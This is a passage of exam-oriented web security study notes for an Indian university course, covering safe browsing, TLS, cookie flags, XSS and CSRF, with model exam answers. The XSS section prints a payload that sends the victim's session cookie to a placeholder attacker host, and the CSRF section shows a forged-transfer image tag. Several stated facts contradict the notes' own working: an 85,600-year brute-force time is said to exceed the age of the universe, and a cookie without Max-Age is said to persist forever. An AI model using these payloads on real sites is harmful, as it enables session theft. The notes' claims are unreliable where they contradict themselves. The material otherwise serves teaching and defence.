> 2. **Mis-stating the SOP triple:** Always list **Scheme, Host, AND Port**. Many students omit Port, losing 1 mark.
> 3. **Drive-By ≠ Phishing:** Phishing requires user action (clicking). Drive-by does *not* — mere page load suffices.
> 4. **CORS ≠ SOP:** CORS is the *relaxation* mechanism, not the SOP itself. Conflating them is a common 2-mark deduction.

---

## Topic Recap & Important Things to Remember

- **Web Browser Attacks** exploit the browser as a high-trust, high-exposure client application.
- **Same-Origin Policy (SOP)** = $(S, H, P)$ triple — primary browser defense.
- **XSS variants:** Reflected (URL), Stored (DB), DOM-based (client-side).
- **CSRF:** Exploits automatic cookie attachment; mitigated by anti-CSRF tokens + `SameSite` cookies.
- **Clickjacking:** Hidden iframe overlay; mitigated by `X-Frame-Options: DENY`.
- **MITB attack:** Trojan *inside* the browser hooks JS APIs; **TLS is irrelevant**.
- **Drive-By Downloads:** Exploit kits (Angler, RIG, Magnitude) fingerprint browser and deliver exploits.
- **Watering Hole:** Compromises trusted third-party sites used by target group.
- **Malvertising:** Malicious code via legitimate ad networks.
- **Cookie security flags:** `HttpOnly` (blocks JS access), `Secure` (HTTPS only), `SameSite` (CSRF mitigation).
- **Browser defense layers:** TLS → Sandbox → SOP/CORS → CSP → Cookie flags → Safe Browsing API → User awareness.
- **Mathematical quick-reference:** Cookie-theft probability $P = 1 - (1-p)^n$.
- **CVE hot spots:** JS engines (V8, SpiderMonkey), DOM parsers, plugin runtimes (legacy Flash/Java).
- **Defense-in-depth is mandatory:** No single control eliminates browser attack risk.
- **High-yield exam terms:** SOP, MITB, XSS, CSRF, drive-by, exploit kit, malvertising, watering hole, CSP, CORS.

<!-- SECTION_5_END -->

topics.title: Operating Safely (Web)
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PCCCT502 - NETWORK AND SYSTEM SECURITY
> - **Module:** Module-4
> - **Topic:** Operating Safely (Web)

<!-- SECTION_1_START -->
## SECTION 1: Core Technical Definition & Intuitive Overview

### 1.1 Formal Academic Definition (KTU 2024 Terminology)

> [!IMPORTANT]
> **Operating Safely on the Web** refers to the set of practices, protocols, tools, and behavioral patterns that a user must adopt while interacting with web-based services (browsers, websites, cloud applications, webmail, social platforms, e-commerce portals) to preserve **Confidentiality, Integrity, and Availability (CIA)** of their data, identity, and computing device against web-borne threats.

In KTU 2024 Scheme parlance, this topic sits at the intersection of **end-user security awareness** and **applied web security engineering**, covering:

- The **HTTP/HTTPS** trust model and the role of **TLS (Transport Layer Security)**
- Browser sandboxing, **Same-Origin Policy (SOP)**, and **Content Security Policy (CSP)**
- State management via **Cookies** and **Sessions**
- Web-borne threat vectors: **Phishing, Drive-by Downloads, Malvertising, Cross-Site Scripting (XSS), Man-in-the-Middle (MitM)**
- Privacy hygiene: tracking pixels, third-party cookies, fingerprinting
- Operational hygiene: patching, password managers, MFA, VPN usage

### 1.2 Conceptual Analogy / Intuition

> [!NOTE]
> **Analogy: Driving Safely on a Highway**
> 
> Imagine the **Internet is a public highway** and the **Web is the marketplace of shops lining that highway**. Operating safely on the web is exactly like driving safely in a busy city:
> 
> - The **padlock icon in the browser address bar** is the **shop's license certificate** — you only buy from licensed shops.
> - **HTTPS / TLS** is the **armored cash-delivery van** that escorts your money and goods without anyone peeking in.
> - **Cookies** are the **loyalty cards** the shop gives you — useful, but they also let the shop (and its partners) track what other shops you visit.
> - **Phishing emails** are **fake parking attendants** who look official but actually steal your car keys.
> - **Browser sandboxing** is the **crumple zone + airbag** — even if you crash, the damage stays contained to the browser, not the engine (your OS).
> - **Antivirus / Updates** are the **regular car servicing** — keeps all safety systems functional.
> - **A password manager + MFA** is the **steering wheel lock + biometric ignition** — two independent barriers before the car starts.

A safe web user is therefore one who **recognizes danger signs, locks down their "vehicle," and never hands the keys to strangers**.

### 1.3 Key Standard Metrics (KTU Board Exam Keywords)

The following terms carry **2-mark definitional weight** in KTU examinations and must be memorized verbatim:

- **HTTPS** — HyperText Transfer Protocol **Secure** (HTTP over TLS, default port **443**).
- **TLS** — Transport Layer Security (current versions: **TLS 1.2** and **TLS 1.3**).
- **XSS** — Cross-Site Scripting.
- **CSRF** — Cross-Site Request Forgery.
- **MitM** — Man-in-the-Middle attack.
- **SOP** — Same-Origin Policy.
- **CSP** — Content Security Policy.
- **PKI** — Public Key Infrastructure (the trust backbone of HTTPS).
- **2FA / MFA** — Two-Factor / Multi-Factor Authentication.
<!-- SECTION_1_END -->

<!-- SECTION_2_START -->
## SECTION 2: Deep Theoretical Analysis & KTU High-Yield Formula Sheet

### 2.1 Layered Model of "Operating Safely on the Web"

Safety is not a single product; it is a **stack of overlapping defenses** (a *defense-in-depth* model). KTU 2024 expects students to describe each layer and its role.

1. **Transport Layer (Network) — "Is the channel private?"**
   - **HTTPS / TLS** encrypts traffic end-to-end between browser and server.
   - Prevents **eavesdropping, tampering, and MitM** on untrusted Wi-Fi (cafes, airports).
   - Trust anchored by **X.509 digital certificates** issued by trusted **Certificate Authorities (CAs)**.

2. **Application Layer (Browser) — "Is the content safe to run?"**
   - **Browser Sandboxing**: tabs run in restricted processes; a malicious site cannot directly read files on disk.
   - **Same-Origin Policy (SOP)**: a script loaded from `siteA.com` cannot read data belonging to `siteB.com`.
   - **Content Security Policy (CSP)**: server tells the browser which script sources are *legitimate*; blocks inline/injected scripts.
   - **XSS Filter / Reflected XSS auditor**: built-in heuristics to neutralize malicious JavaScript.

3. **Identity & Authentication Layer — "Is the user really the user?"**
   - **Strong, unique passwords** (≥ 12 characters, mixed classes).
   - **Password managers** (e.g., KeePass, Bitwarden) to avoid reuse.
   - **MFA / 2FA** via TOTP apps or hardware tokens (FIDO2 / YubiKey).
   - **Phishing-resistant MFA** (passkeys, WebAuthn) — preferred over SMS OTP.

4. **Privacy Layer — "Who is watching?"**
   - **First-party vs Third-party cookies**.
   - **Do-Not-Track (DNT)** — historically opt-in header (now largely deprecated).
   - **Tracker blocking** via browser extensions (uBlock Origin, Privacy Badger).
   - **VPN / Tor** for IP anonymity on untrusted networks.

5. **Endpoint Layer — "Is the device healthy?"**
   - **OS & Browser updates** patched regularly.
   - **Antivirus / EDR** scanning downloads.
   - **Pop-up & download warnings** — never bypassed.
   - **Full-disk encryption** (BitLocker, FileVault) for laptop theft scenarios.

6. **Behavioral Layer — "Is the user alert?"**
   - Verify sender, URL spelling, and HTTPS before clicking.
   - Never plug in found USB drives.
   - Don't reuse passwords across sites.

### 2.2 Core Web Threat Catalogue (KTU High-Yield)

| # | Threat | Mechanism | User-Level Defense |
|---|--------|-----------|---------------------|
| 1 | **Phishing** | Fake email/site mimicking a trusted brand to steal credentials | Hover over links; check sender domain; use MFA |
| 2 | **Spear Phishing** | Targeted phishing using personal info (LinkedIn, Facebook) | Verify out-of-band for financial requests |
| 3 | **Whaling** | Phishing aimed at executives (CEO fraud / BEC) | Approval workflows; awareness training |
| 4 | **Drive-by Download** | Visiting a compromised site auto-downloads malware | Keep browser/Flash/Java patched; use script blockers |
| 5 | **Malvertising** | Malicious code embedded in legitimate ad networks | Ad-blocker; reputable ad networks |
| 6 | **Man-in-the-Middle (MitM)** | Attacker intercepts traffic on open Wi-Fi | Use HTTPS only; avoid public Wi-Fi without VPN |
| 7 | **SSL Stripping** | Downgrades HTTPS → HTTP via MitM | HSTS (HTTP Strict Transport Security) headers |
| 8 | **XSS (Stored / Reflected / DOM)** | Injected JS runs in victim's browser | CSP; output encoding; input sanitization |
| 9 | **CSRF** | Browser auto-sends auth cookies to attacker site | Anti-CSRF tokens; SameSite cookies |
| 10 | **Session Hijacking** | Stealing session cookie (XSS, network sniffing) | HttpOnly + Secure + SameSite cookie flags |
| 11 | **Clickjacking** | Invisible iframe tricks user into clicking | X-Frame-Options / frame-ancestors CSP |
| 12 | **Credential Stuffing** | Reusing leaked passwords across sites | Unique passwords; breach monitoring; MFA |
| 13 | **Browser Fingerprinting** | Identifying user by browser/OS/screen config | Tor Browser; resist panopticlick |
| 14 | **Ransomware via Web** | Malicious attachment/download encrypts files | Backups; least-privilege user accounts |

### 2.3 Cookies, Sessions & the State Problem

HTTP is **stateless** — every request is independent. To recognize a logged-in user, web apps use **state tokens**:

- **Cookie**: small key=value pair stored by the browser, sent back on every request to the same domain.
   - `Secure` flag → only sent over **HTTPS**.
   - `HttpOnly` flag → JavaScript cannot read it (mitigates XSS-based theft).
   - `SameSite=Strict/Lax` → mitigates CSRF.
   - `Domain` and `Path` → scope of cookie visibility.
- **Session ID**: usually a random, opaque token (e.g., `Set-Cookie: SESSIONID=abc123; HttpOnly; Secure; SameSite=Lax`).
- **JWT (JSON Web Token)**: stateless session token, signed (HMAC) or encrypted (JWE), stored in `localStorage` or cookies.

> [!IMPORTANT]
> **KTU Board Emphasis:** Students are repeatedly tested on **cookie flags** and the **threat each flag mitigates**. Memorize the mapping:
> - `Secure` → eavesdropping
> - `HttpOnly` → XSS cookie theft
> - `SameSite` → CSRF

### 2.4 HTTPS, TLS, and the Trust Chain

HTTPS = **HTTP over TLS**. The trust model relies on **PKI**:

1. Server presents an **X.509 certificate** containing its public key, domain name, issuer, and validity period.
2. Browser verifies the certificate chain up to a **trusted root CA** stored in the OS/browser trust store.
3. **TLS handshake** negotiates cipher suite, exchanges keys (RSA or ECDHE), and establishes a **session key**.
4. All subsequent HTTP traffic is encrypted with this symmetric key.

**Cipher Suite Example (TLS 1.2):** `TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384`

| Component | Meaning |
|-----------|---------|
| `ECDHE` | Ephemeral Elliptic Curve Diffie-Hellman (key exchange, provides *forward secrecy*) |
| `RSA` | Server authentication / signature algorithm |
| `AES_256_GCM` | Symmetric encryption (256-bit AES in Galois/Counter Mode) |
| `SHA384` | Hash for HMAC / PRF |

**TLS 1.3** simplified to 5 cipher suites, all providing **forward secrecy**, and removed insecure primitives (MD5, SHA-1, RC4, 3DES).

**HSTS (HTTP Strict Transport Security):** server sends `Strict-Transport-Security: max-age=31536000; includeSubDomains` to force browser to use HTTPS for future visits — defeats **SSL stripping**.

### 2.5 KTU Formula Sheet / Cheat Sheet

> [!NOTE]
> Since web safety is a **qualitative + protocol-engineering** topic, the "formulas" below are the **canonical numerical thresholds and mappings** that frequently appear in 2-mark and 14-mark questions.

| Concept | Equation / Rule | Use / KTU Relevance |
|---------|-----------------|---------------------|
| Password entropy | $E = \log_2(R^L)$ bits | $R$ = character set size, $L$ = length. Lower bound **≥ 60 bits** for strong password. |
| Combinations of password | $C = R^L$ | Total search space for brute force. |
| Avg. brute-force time | $T = \dfrac{C}{2 \cdot r}$ seconds | $r$ = guesses/sec. Threshold for infeasibility: $T > 10^9$ years. |
| HTTPS port | $443$ | TCP port for HTTPS (HTTP = $80$). |
| TLS 1.3 RTT to first byte | $1$ RTT (0-RTT resumption possible) | Performance vs. TLS 1.2's 2 RTT. |
| XSS payload encoding | HTML-entity + JS-escape | Defense rule: encode at output, not input. |
| Cookie max age | `Max-Age=<seconds>` | Persistent vs. session cookies. |
| HSTS preload | `max-age ≥ 31536000` (1 year) | Required to be on Chromium HSTS preload list. |
| Risk score (qualitative) | $R = P \times I$ | $P$ = probability, $I$ = impact (used in KTU risk-management questions). |
| CIA triad | $\{C, I, A\}$ | **Confidentiality, Integrity, Availability** — base of all web-safety reasoning. |
| HTTP methods allowed for SOP safe browsing | `GET, HEAD` | `PUT, DELETE, POST` from cross-origin trigger preflight. |
| CORS preflight | `OPTIONS` request | Browser sends before cross-origin non-simple requests. |

### 2.6 Real-World Engineering Utility

Operating safely on the web is not just for home users:

- **Banking & FinTech**: SOC 2, PCI-DSS, and RBI mandates require MFA + HSTS + secure cookies.
- **Healthcare (HIPAA)**: web portals must enforce TLS 1.2+ and strict session management.
- **Enterprise SaaS**: uses CSP, HSTS, SameSite cookies, and FIDO2 passkeys to satisfy ISO 27001 audits.
- **DevSecOps pipelines**: SAST/DAST tools (OWASP ZAP, Burp Suite) automate web safety testing before deployment.

## SECTION 3: Step-by-Step Derivations & Analytical Matrix

### 3.1 Analytical Matrix — "How a Secure Web Request Actually Flows"

We trace one click: a user types `https://mail.example.com/inbox` into Chrome. We will annotate every safety mechanism that activates.

> [!NOTE]
> This matrix is the **canonical 14-mark answer** KTU expects for the question *"Explain with a diagram the security mechanisms involved when a user accesses a website securely."*

| Step | User Action | What Happens Internally | Safety Mechanism Activated |
|------|-------------|-------------------------|----------------------------|
| 1 | Types URL | Browser parses scheme, host, port, path | URL validation; IDN homograph check |
| 2 | DNS resolution | `mail.example.com` → IP via DNS-over-HTTPS (DoH) | Prevents DNS poisoning / MitM on resolver |
| 3 | TCP connect | Three-way handshake to IP:443 | OS-level firewall check |
| 4 | TLS handshake begins | `ClientHello` with supported cipher suites, SNI | SNI exposes intended host; client picks strongest mutual cipher |
| 5 | Server presents certificate | X.509 cert with public key | Browser checks: not expired, hostname matches, signed by trusted CA, not revoked (OCSP/CRL) |
| 6 | Key exchange | ECDHE → derives session key | **Forward secrecy** — past traffic safe even if long-term key is later compromised |
| 7 | Encrypted tunnel established | All HTTP bytes now wrapped in TLS records | Confidentiality + Integrity (AEAD: AES-GCM) |
| 8 | HSTS check | Browser consults internal HSTS cache for the domain | Forces HTTPS; blocks SSL-strip downgrade |
| 9 | HTTP request sent | `GET /inbox HTTP/1.1` + `Cookie: SESSIONID=…` | `Secure` cookie flag prevents leak over HTTP |
| 10 | Server checks session | Looks up SESSIONID, returns inbox HTML | HttpOnly cookie → JS on page cannot read session token |
| 11 | Browser receives HTML | Parses, fetches sub-resources | CSP header restricts script sources → blocks injected inline JS |
| 12 | SOP enforced | `api.example.com` script cannot read DOM of `mail.example.com` | Origin = (scheme, host, port) |
| 13 | CORS check (if needed) | Browser sends `OPTIONS` preflight to cross-origin API | Server replies `Access-Control-Allow-Origin`; else block |
| 14 | User clicks "Logout" | Browser sends `POST /logout` | SameSite=Lax cookie + CSRF token prevent attacker-triggered logout |
| 15 | Page reloaded later | `Set-Cookie: SESSIONID=…; Max-Age=1800` | Session expires after 30 min → limits hijack window |

### 3.2 Quantitative Walkthrough — Password Entropy vs. Brute-Force Time

> A KTU 14-mark question often asks: *"Compare the security of a 6-character lowercase password vs. a 12-character mixed password."* We walk through the full computation.

**Step 1 — Define the character set sizes.**

$$
\begin{aligned}
R_{\text{lowercase}} &= 26 \quad (\text{a..z}) \\[2pt]
R_{\text{upper+lower}} &= 52 \\[2pt]
R_{\text{alphanumeric}} &= 62 \\[2pt]
R_{\text{full-ASCII-printable}} &= 95 \quad (\text{incl. symbols, space}) 
\end{aligned}
$$

**Step 2 — Compute total search space $C = R^L$.**

$$
\begin{aligned}
C_{\text{6, lowercase}} &= 26^6 = 308{,}915{,}776 \approx 3.09 \times 10^{8} \\[2pt]
C_{\text{12, mixed+symbol}} &= 95^{12} = 5.40 \times 10^{23} 
\end{aligned}
$$

**Step 3 — Compute entropy $E = \log_2(R^L) = L \log_2 R$ in bits.**

$$
\begin{aligned}
E_{\text{6, lowercase}} &= 6 \cdot \log_2 26 = 6 \cdot 4.700 \approx 28.2 \text{ bits} \\[2pt]
E_{\text{12, mixed+symbol}} &= 12 \cdot \log_2 95 = 12 \cdot 6.570 \approx 78.8 \text{ bits} 
\end{aligned}
$$

**Step 4 — Compute average brute-force time $T = C / (2 r)$.**

Assume an offline attacker using a modern GPU rig at $r = 10^{11}$ guesses/sec (≈ 100 billion/sec, realistic for MD5/SHA-1 hash cracking).

$$
\begin{aligned}
T_{\text{6, lowercase}} &= \dfrac{3.09 \times 10^{8}}{2 \times 10^{11}} \approx 1.5 \times 10^{-3} \text{ seconds} \;\;(\approx 1.5 \text{ ms}) \\[4pt]
T_{\text{12, mixed+symbol}} &= \dfrac{5.40 \times 10^{23}}{2 \times 10^{11}} = 2.7 \times 10^{12} \text{ seconds} \\[4pt]
&\approx 8.56 \times 10^{4} \text{ years} \;\;(\approx 85{,}600 \text{ years}) 
\end{aligned}
$$

**Step 5 — Interpretation.**

> [!IMPORTANT]
> - 6-character lowercase password is **broken in milliseconds** — utterly insecure.
> - 12-character full-symbol password exceeds the **age of the universe (≈ 13.8 × 10⁹ years)** in attack time, but *only* if the password is **truly random** and **not reused**.
> - This is why KTU and NIST recommend **length over complexity** and passphrases (e.g., `correct-horse-battery-staple`) over `P@ssw0rd1`.

**Step 6 — Account for human password patterns.**

If users choose from a dictionary of 10,000 common words, an 8-word passphrase has:

$$
C = 10000^8 = 10^{32}, \quad E = 8 \cdot \log_2 10000 = 8 \cdot 13.29 \approx 106.3 \text{ bits}
$$

Still infeasible, *provided* each word is random (diceware-style).

### 3.3 Decision Flow — "Should I Click This Link?"

A KTU favorite: *"Explain the steps a user should follow before clicking a link in an email."*

1. **Pause** — does the email create urgency? ("Account will be closed in 24 hours!") → high-risk signal.
2. **Verify sender** — display name "PayPal Support" with address `paypa1@gmail.com` → spoofed.
3. **Hover over the link** — does the URL match the legitimate domain? `paypal.com-secure-login.tk` → not PayPal.
4. **Check for HTTPS + valid certificate** — if forced to log in, type the URL manually; never click from email.
5. **Look for telltale phishing signs** — generic greeting, grammar errors, mismatched branding.
6. **Confirm out-of-band** — call the sender on a known phone number for any financial request.
7. **Report** — use the email client's "Report Phishing" button; delete after reporting.

### 3.4 Worked Example — Identifying an XSS Vulnerability in a Cookie Context

> Consider this server response header:
> `Set-Cookie: sessionid=abc123; Path=/`
> 
> **Question:** List all the security issues and propose corrected headers.

**Issues identified:**

$$
\begin{aligned}
\text{Issue 1: Missing } \texttt{Secure} &\Rightarrow \text{cookie can be sent over plain HTTP (eavesdropping).} \\[2pt]
\text{Issue 2: Missing } \texttt{HttpOnly} &\Rightarrow \text{JavaScript (XSS payload) can read the session.} \\[2pt]
\text{Issue 3: Missing } \texttt{SameSite} &\Rightarrow \text{cross-site request forgery possible.} \\[2pt]
\text{Issue 4: Missing } \texttt{Domain/Path} \text{ restriction} &\Rightarrow \text{over-broad scope.} \\[2pt]
\text{Issue 5: No } \texttt{Expires/Max-Age} &\Rightarrow \text{cookie persists forever (session hijack window).} 
\end{aligned}
$$

**Hardened header:**

```
Set-Cookie: sessionid=abc123; Secure; HttpOnly; SameSite=Strict;
            Path=/; Max-Age=1800; Domain=mail.example.com
```

This single header now defends against all four classic cookie attacks — a frequent **5-mark sub-question** in KTU papers.

## SECTION 5: KTU 2024 Scheme Examination Question Bank & Topic Recap

---

### PART A — 3 Mark Questions (Short Answer, Definition Type)

> **[KTU University Exam — Dec 2023]**
> **Q1. Define Phishing. Mention any two indicators of a phishing email.**

**Model Answer:**

Phishing is a social-engineering attack in which an attacker masquerades as a trustworthy entity (bank, employer, vendor) via email, SMS, or a fake website, in order to trick the user into revealing credentials, financial data, or installing malware.

**Two indicators of a phishing email:**

1. **Mismatched or spoofed sender domain** — display name says "PayPal Support" but the actual address is `paypa1@gmail.com` or a look-alike domain such as `paypall.com`.
2. **Urgency / fear-based language combined with a generic greeting** — e.g., *"Dear Customer, your account will be suspended in 24 hours, click here to verify,"* rather than addressing the user by name.

*(Any other valid indicators: suspicious links on hover, unexpected attachments, missing HTTPS on the landing page, requests for credentials via email — full marks.)*

---

> **[KTU University Exam — May 2024]**
> **Q2. What is the Same-Origin Policy (SOP)? Why is it important for web safety?**

**Model Answer:**

**Definition:** The Same-Origin Policy is a fundamental browser security mechanism that restricts how a document or script loaded from one *origin* can interact with resources from another origin. An **origin** is defined by the triple **(scheme, host, port)** — all three must match.

**Importance for web safety:**

1. **Prevents cross-origin data theft** — JavaScript running on `evil.com` cannot read the DOM, cookies, or `localStorage` of `bank.com`, blocking the most common XSS-driven exfiltration.
2. **Isolates sessions** — a malicious site cannot piggyback on the user's authenticated session with another site.
3. **Forms the foundation for CORS** — same-origin restriction is deliberately strict; servers opt-in to controlled cross-origin sharing via CORS headers.

---

### PART B — 14 Mark Questions (Long Answer, with Internal Choice)

---

#### ✅ **QUESTION A (14 Marks)** — *[KTU Model Paper, 2024 Scheme]*

> **(a) [7 Marks]** Explain the **HTTPS / TLS handshake** with a neat diagram. List the security properties TLS guarantees.
> 
> **(b) [7 Marks]** Describe **HTTP Strict Transport Security (HSTS)** and **Content Security Policy (CSP)**. How do they each enhance web safety?

##### Model Solution — Part (a) — 7 Marks

**TLS Handshake (TLS 1.2, RSA key exchange shown for simplicity):**

1. **ClientHello** — Browser sends supported TLS version, cipher suites, and a random `ClientRandom`.
2. **ServerHello** — Server picks the strongest mutually-supported cipher suite and sends its `ServerRandom`.
3. **Certificate** — Server presents its X.509 certificate (public key, domain, issuer, validity).
4. **ServerHelloDone** — Server signals handshake half-complete.
5. **ClientKeyExchange** — Browser generates a **pre-master secret**, encrypts it with the server's public key, and sends it.
6. **Both sides derive the session key** = `PRF(pre-master, ClientRandom, ServerRandom)`.
7. **ChangeCipherSpec + Finished** — Both sides switch to encrypted communication and verify the handshake hash.

**Diagram:**

```mermaid
sequenceDiagram
    participant C as Browser
    participant S as Web Server
    C->>S: ClientHello (versions, ciphers, ClientRandom)
    S->>C: ServerHello (chosen cipher, ServerRandom)
    S->>C: Certificate (X.509) + ServerHelloDone
    C->>C: Verify cert chain to trusted CA
    C->>S: ClientKeyExchange (pre-master encrypted with server pub key)
    C->>S: ChangeCipherSpec + Finished (encrypted)
    S->>C: ChangeCipherSpec + Finished (encrypted)
    Note over C,S: Symmetric session key established
    C->>S: Application data (HTTP) encrypted
    S->>C: Application data (HTTP) encrypted
```

**Security properties guaranteed:**

$$
\begin{aligned}
\text{Confidentiality} &\Leftarrow \text{Symmetric encryption (AES-GCM/ChaCha20)} \\
\text{Integrity} &\Leftarrow \text{AEAD authentication tag} \\
\text{Server Authentication} &\Leftarrow \text{X.509 certificate verified against trusted CA} \\
\text{(Optional) Forward Secrecy} &\Leftarrow \text{ECDHE — session key independent of long-term key}
\end{aligned}
$$

(Allocate marks: handshake flow 3, diagram 2, security properties 2 = 7 marks.)

##### Model Solution — Part (b) — 7 Marks

**HTTP Strict Transport Security (HSTS):**

- Server sends the response header:
   `Strict-Transport-Security: max-age=31536000; includeSubDomains; preload`
- Browser, on receipt, refuses to make any future connection to that domain over plain HTTP for `max-age` seconds.
- Prevents **SSL stripping attacks** where an MitM on a public Wi-Fi rewrites HTTPS links to HTTP.
- Domains submitted to the **Chromium HSTS preload list** are *baked into* the browser, so the first visit is also HTTPS-only.

**Content Security Policy (CSP):**

- Server sends header such as:
   `Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'; base-uri 'self'; frame-ancestors 'none'`
- This is a **whitelist of permitted resource origins** for the page.
- **Mitigates XSS** by blocking inline scripts (`<script>alert(1)</script>`) and unauthorized script sources.
- **Mitigates clickjacking** via `frame-ancestors 'none'`.
- **Defense in depth** — even if an XSS bug exists, the injected script cannot load its malicious payload.

**Comparison summary:**

$$
\begin{aligned}
\text{HSTS} &\rightarrow \text{defends the transport layer (against MitM, SSL strip).} \\
\text{CSP} &\rightarrow \text{defends the application layer (against XSS, data exfil, clickjacking).} \\
\text{Both} &\rightarrow \text{server-driven policy headers; browser-enforced; zero user effort.}
\end{aligned}
$$

(Allocate: HSTS explanation 3, CSP explanation 3, comparative significance 1 = 7 marks.)

---

#### ✅ **QUESTION B (14 Marks — Internal Choice Alternative)** — *[KTU University Exam — Dec 2024]*

> **(a) [7 Marks]** What are **Cookies**? Explain the role of the `Secure`, `HttpOnly`, and `SameSite` flags. Why is `HttpOnly` not a defense against CSRF?
> 
> **(b) [7 Marks]** With an example, explain **Cross-Site Scripting (XSS)** and **Cross-Site Request Forgery (CSRF)**. List four defenses against each.

##### Model Solution — Part (a) — 7 Marks

**Cookies** are small key–value pairs that a web server asks the browser to store and to send back with every subsequent request to the same domain, thereby converting stateless HTTP into a stateful session.

**Header syntax:**
`Set-Cookie: <name>=<value>; Expires=<date>; Max-Age=<seconds>; Domain=<host>; Path=<path>; Secure; HttpOnly; SameSite=<Strict|Lax|None>`

**Role of each flag:**

| Flag | Effect | Threat Mitigated |
|------|--------|------------------|
| `Secure` | Cookie is sent **only** over HTTPS | Eavesdropping on open Wi-Fi (MitM) |
| `HttpOnly` | Cookie is **inaccessible to JavaScript** (`document.cookie` does not return it) | XSS-based cookie theft / session hijack |
| `SameSite=Strict` | Cookie is **never** sent on cross-site requests | CSRF |
| `SameSite=Lax` | Cookie sent only on *top-level* safe navigations (e.g., link clicks, not `<iframe>` POSTs) | Most CSRF, with usability compromise |
| `Max-Age` / `Expires` | Limits cookie lifetime | Long-lived hijack window |
| `Domain` + `Path` | Restrict scope | Over-broad exposure |

**Why `HttpOnly` does NOT defend against CSRF:**

- CSRF does **not** need to *read* the cookie — the attack simply *triggers* a request that the browser automatically attaches the cookie to.
- `HttpOnly` blocks JavaScript from reading the cookie value, but the browser still includes it in cross-origin requests (unless `SameSite` blocks it).
- Therefore, the correct CSRF defense is **`SameSite=Strict` + synchronizer/anti-CSRF token**, not `HttpOnly`.

(Allocate: cookies 2, flags 3, why HttpOnly ≠ CSRF defense 2 = 7 marks.)

##### Model Solution — Part (b) — 7 Marks

**Cross-Site Scripting (XSS):** A vulnerability where an attacker injects malicious client-side script (usually JavaScript) into a web page viewed by other users. Three types:

1. **Stored XSS** — payload saved in the database (e.g., in a comment field) and served to every visitor.
2. **Reflected XSS** — payload in the URL/query string is echoed back in the response.
3. **DOM-based XSS** — payload manipulates the client-side JavaScript environment without server involvement.

**Example (Reflected XSS):**
Vulnerable URL: `https://search.example.com/?q=<script>fetch('//attacker/?c='+document.cookie)</script>`
If the server renders `q` unescaped, the script executes in the victim's browser and exfiltrates the session cookie.

**Defenses against XSS:**

1. **Output encoding / escaping** — HTML-encode `<`, `>`, `"`, `'`, `&` before insertion into HTML.
2. **Content Security Policy (CSP)** — `script-src 'self'` blocks inline scripts.
3. **HttpOnly cookies** — even if XSS runs, the session cookie cannot be read.
4. **Input validation** — whitelist allowed characters; reject anything else.
5. **Use frameworks that auto-escape** (React, Angular with strict context).
6. **Trusted Types** (modern browser API) — only allow pre-approved sanitized values.

**Cross-Site Request Forgery (CSRF):** An attack where the victim, while authenticated to a target site, is tricked into submitting a forged request (e.g., via a hidden form on an attacker page) that performs a state-changing action — money transfer, password change, email update.

**Example (GET-based CSRF):**
`<img src="https://bank.com/transfer?to=attacker&amt=5000" />`
If the user is logged in to `bank.com`, the browser sends the cookie automatically, and the transfer executes.

**Defenses against CSRF:**

1. **Anti-CSRF tokens** — unpredictable per-session token embedded in forms; server validates on submit.
2. **`SameSite=Strict/Lax` cookies** — browser refuses to send the session cookie on cross-site requests.
3. **Double-Submit Cookie pattern** — server compares a token in a cookie with one in the request body.
4. **Checking `Origin` / `Referer` header** on the server.
5. **Re-authentication / step-up auth** for high-value actions.

(Allocate: XSS explanation + example 2, XSS defenses 1.5, CSRF explanation + example 2, CSRF defenses 1.5 = 7 marks.)

---

> [!WARNING]
> **KTU Examiner's Valuation Warning / Common Pitfalls**
> 
> 1. **Confusing XSS with CSRF** — many students write the *same* defenses for both. The examiner's key marks specifically test whether you know **XSS = inject JS into a page** vs **CSRF = abuse the user's authenticated session on a different site**. State the distinction explicitly.
> 2. **Writing `HttpOnly` as a CSRF defense** — this is a **classic 1–2 mark deduction**. Always clarify that `HttpOnly` only blocks JS *reading* the cookie; the browser still *sends* it cross-site, hence the real CSRF defense is `SameSite` or anti-CSRF tokens.
> 3. **Forgetting `Secure` flag implications** — the examiner will check if you understand that `Secure` requires the entire connection to be HTTPS, and that without it, cookies leak on the *first* HTTP redirect.
> 4. **TLS handshake missing steps** — many students omit `ServerHelloDone` and forget the role of the **pre-master secret**. Always include: random nonces → certificate exchange → key derivation → Finished.
> 5. **CSP without an example header** — CSP answers without a literal `Content-Security-Policy: …` header value are marked down. Always provide a **concrete header line**.
> 6. **HSTS preload not mentioned** — for full marks on HSTS, mention that browsers ship a *preloaded list*, so the first visit is also protected.

---

### 🧠 Topic Recap & Important Things to Remember (Rapid Revision Checklist)

- ✅ **CIA triad** — Confidentiality, Integrity, Availability — is the bedrock of every web-safety argument.
- ✅ **HTTPS = HTTP + TLS**, port **443**; HTTP = port **80**.
- ✅ **TLS 1.3** is the current standard; provides **forward secrecy by default** (via ECDHE).
- ✅ **X.509 certificates** are the trust anchor; browser checks chain → trusted root CA.
- ✅ **HSTS** prevents SSL stripping; **CSP** prevents XSS data exfiltration.
- ✅ **Cookie flags** (memorize the mapping):
   - `Secure` → no plain-HTTP leak
   - `HttpOnly` → no JS read (XSS defense)
   - `SameSite=Strict/Lax` → CSRF defense
- ✅ **XSS = script injection into your page**; **CSRF = abuse of your session from another page**.
- ✅ **SOP = (scheme, host, port)** triple; **CORS = server opt-in to relax SOP**.
- ✅ **Phishing defenses**: verify sender, hover-check URLs, prefer FIDO2/passkeys over passwords + SMS OTP.
- ✅ **MFA / 2FA** dramatically reduces account-takeover success — even if password leaks.
- ✅ **Public Wi-Fi + HTTP = trivial MitM**; use VPN or only HTTPS sites.
- ✅ **Software updates** patch CVEs that enable drive-by downloads and RCE.
- ✅ **Password entropy formula**: $E = L \cdot \log_2 R$ bits. Aim for **≥ 60 bits**, i.e., ≥ 12 random characters.
- ✅ **No security product substitutes for user awareness** — the **Behavioral Layer** is the last and most critical line of defense.
- ✅ KTU buzzwords for 2-markers: **PKI, TLS, SOP, CSP, HSTS, XSS, CSRF, MitM, MFA, FIDO2, Passkey, DoH, OCSP stapling**.
<!-- SECTION_5_END -->

topics.title: Web Security - How HTTP Works
topics.content:
> **APJ ABDUL KALAM TECHNOLOGICAL UNIVERSITY (KTU) | 2024 SCHEME**
> - **Course:** PCCCT502 - NETWORK AND SYSTEM SECURITY
> - **Module:** Module Module-4
> - **Topic:** Web Security - How HTTP Works

<!-- SECTION_1_START -->
